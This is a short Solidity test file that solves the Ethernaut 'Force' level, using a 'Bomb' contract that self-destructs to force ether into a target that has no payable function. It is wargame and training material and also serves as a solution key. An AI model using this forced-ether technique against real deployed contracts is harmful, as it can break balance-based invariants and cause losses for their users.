// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Force} from "../src/levels/Force.sol";

/// Ethernaut #7 "Force" → forced-ether technique (no catalog entry; a contract can't refuse ETH from
/// SELFDESTRUCT). Win: contract balance > 0.
contract Bomb {
    constructor(address payable target) payable {
        selfdestruct(target); // force-send our balance to a contract with no payable function
    }
}

contract ForceTest is Test {
    function test_solve_force() public {
        Force lvl = new Force();
        new Bomb{value: 1 ether}(payable(address(lvl)));
        assertGt(address(lvl).balance, 0, "ether forced into Force");
    }
}
